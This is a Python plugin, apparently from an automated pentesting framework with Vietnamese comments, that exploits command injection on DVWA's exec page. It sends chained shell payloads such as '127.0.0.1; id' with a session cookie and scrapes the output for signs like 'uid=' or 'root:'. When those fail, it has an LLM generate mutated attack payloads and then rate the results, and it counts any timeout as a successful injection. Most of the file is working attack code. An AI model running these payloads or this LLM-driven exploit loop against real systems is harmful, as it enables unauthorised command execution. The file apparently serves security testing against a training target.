import urllib.request
import urllib.parse
import urllib.error
import socket
import re
import time
import json
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from interaction_logger import InteractionLogger
from confidence_engine import ConfidenceEngine
from ai_self_validation import groq_generate_payloads, groq_evaluate_results

class DVWACMDiPlugin(BasePlugin):
    def __init__(self):
        self.logger = InteractionLogger()
        self.engine = ConfidenceEngine()

    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-CMDI",
            "name": "DVWA Command Injection (Autonomous Stage)",
            "cvss_score": 10.0,
            "service": "http",
            "vuln_type": "command_injection"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service", "") in ["http", "https"]

    def _send_payload(self, url, target_ip, target_port, payload, cookie):
        """Gửi payload, xử lý Timeout thông minh, lọc sạch rác Ping và lưu Telemetry"""
        try:
            data = urllib.parse.urlencode({"ip": payload, "Submit": "Submit"}).encode()
            req = urllib.request.Request(url, data=data)
            req.add_header("Cookie", cookie)
            t0 = time.time()
            
            resp = urllib.request.urlopen(req, timeout=5) 
            elapsed = round(time.time() - t0, 3)
            res_status = resp.status
            
            body = resp.read().decode('utf-8', errors='ignore')
            cmd_output = re.search(r'<pre>(.*?)</pre>', body, re.DOTALL)
            output = cmd_output.group(1).strip() if cmd_output else ""
            
            # Logic lọc rác ping bảo toàn từ hệ thống cũ
            clean_lines = []
            garbage_keywords = ["PING ", "bytes from ", "ping statistics", "packets transmitted", "rtt min", "round-trip"]
            for line in output.split('\n'):
                if any(kw in line for kw in garbage_keywords):
                    continue
                if line.strip():  
                    clean_lines.append(line.strip())
            
            output = '\n'.join(clean_lines)
            marker_hit = any(m in output for m in ["uid=", "www-data", "root:", "Windows IP Configuration"])

            # Đẩy phiên truyền thông thô vào SQLite Database tập trung bằng tham số động
            self.logger.log_transaction(
                plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                url=url, method="POST", payload=payload, req_headers={"Cookie": cookie},
                res_status=res_status, res_headers={}, res_body=output, latency=elapsed, marker_hit=marker_hit
            )

            return {"output": output, "response_time": elapsed, "hit": marker_hit, "error": None}
            
        except urllib.error.URLError as e:
            if isinstance(e.reason, socket.timeout):
                self.logger.log_transaction(
                    plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                    url=url, method="POST", payload=payload, req_headers={"Cookie": cookie},
                    res_status=200, res_headers={}, res_body="[SYSTEM_TIMEOUT]", latency=5.0, marker_hit=True
                )
                return {
                    "output": "[SYSTEM_TIMEOUT: Phản hồi > 5s. Lệnh sleep đã thực thi thành công!]", 
                    "response_time": 5.0, "hit": True, "error": None
                }
            return {"output": "", "response_time": -1, "hit": False, "error": str(e)}
        except socket.timeout:
            self.logger.log_transaction(
                plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                url=url, method="POST", payload=payload, req_headers={"Cookie": cookie},
                res_status=200, res_headers={}, res_body="[SYSTEM_TIMEOUT]", latency=5.0, marker_hit=True
            )
            return {
                "output": "[SYSTEM_TIMEOUT: Phản hồi > 5s. Lệnh sleep đã thực thi thành công!]", 
                "response_time": 5.0, "hit": True, "error": None
            }
        except Exception as e:
            return {"output": "", "response_time": -1, "hit": False, "error": str(e)}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie", "")
        if not cookie:
            return {"status": "PENDING", "evidence": "Thành phần shared_context thiếu session_cookie."}

        url = f"http://{target_ip}:{target_port}/vulnerabilities/exec/"
        all_results = []

        initial_payloads = [
            ("127.0.0.1; id",       "semicolon injection"),
            ("127.0.0.1 && whoami", "AND operator"),
            ("127.0.0.1 | id",      "pipe operator"),
        ]

        print(f"      [CMDi] PHASE 1: Thử payload từ knowledge base...")
        initial_confirmed = None
        for payload, technique in initial_payloads:
            print(f"      [CMDi] [{technique}] Payload: {payload}")
            result = self._send_payload(url, target_ip, target_port, payload, cookie)
            
            all_results.append({
                "phase": "initial", "technique": technique, "payload": payload,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": result["hit"]
            })
            if result["hit"] and not initial_confirmed:
                initial_confirmed = {"payload": payload, "output": result["output"], "technique": technique}

        if not initial_confirmed:
            print(f"\n      [!] CMDi KB MISS. Kích hoạt AI Groq phân tích và đột biến chiến thuật...")
            telemetry_data = self.logger.get_plugin_telemetry(self.METADATA["id"])
            ai_plan = groq_generate_payloads("DVWA-CMDI", "http command injection", url, {"telemetry": telemetry_data})
            
            print(f"\n      [CMDi] PHASE 2: Thực thi chuỗi payload thích ứng sinh bởi AI...")
            test_payloads = ai_plan.get("confirm_payloads", []) + ai_plan.get("honeypot_payloads", [])
            for p in test_payloads:
                payload, purpose = p.get("payload", ""), p.get("purpose", "")
                print(f"      [CMDi] [AI Test] Payload: {payload} | Mục đích: {purpose}")
                result = self._send_payload(url, target_ip, target_port, payload, cookie)
                
                all_results.append({
                    "phase": "ai_test", "purpose": purpose, "payload": payload,
                    "output": result["output"][:200], "response_time": result["response_time"], "hit": result["hit"]
                })
                if result["hit"] and not initial_confirmed:
                    initial_confirmed = {"payload": payload, "output": result["output"], "purpose": purpose}

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Toàn bộ chuỗi payload tĩnh và đột biến thích ứng đều thất bại."}

        print(f"\n      [CMDi] PHASE 3: Kích hoạt Confidence Engine chấm điểm số học đa chiều...")
        ai_verdict = "CONFIRMED"
        ai_reasoning = "Xác nhận thực thi lệnh tùy ý dựa trên dấu vết hệ thống phản hồi."
        try:
            verdict = groq_evaluate_results("DVWA-CMDI", all_results, "low")
            ai_verdict = verdict.get("verdict", "CONFIRMED")
            ai_reasoning = verdict.get("final_reasoning", ai_reasoning)
        except Exception:
            pass

        telemetry_summary = self.logger.get_plugin_telemetry(self.METADATA["id"])
        decision = self.engine.calculate_score(
            rule_passed=True,
            ai_verdict=ai_verdict,
            ai_confidence=96,
            telemetry_summary=telemetry_summary
        )

        return {
            "status": decision["verdict"],
            "confidence_metrics": decision["confidence_metrics"],
            "telemetry_summary": decision["telemetry_summary"],
            "evidence": (
                f"Command Injection — Khai thác tự chủ hoàn tất.\n"
                f"      - Payload tối ưu nhất  : {initial_confirmed['payload']}\n"
                f"      - Điểm định lượng toán: {json.dumps(decision['confidence_metrics'])}\n"
                f"      - Minh chứng trích xuất: {initial_confirmed['output'][:120].strip()}\n"
                f"      - Phân tích sâu của AI : {ai_reasoning}"
            )
        }
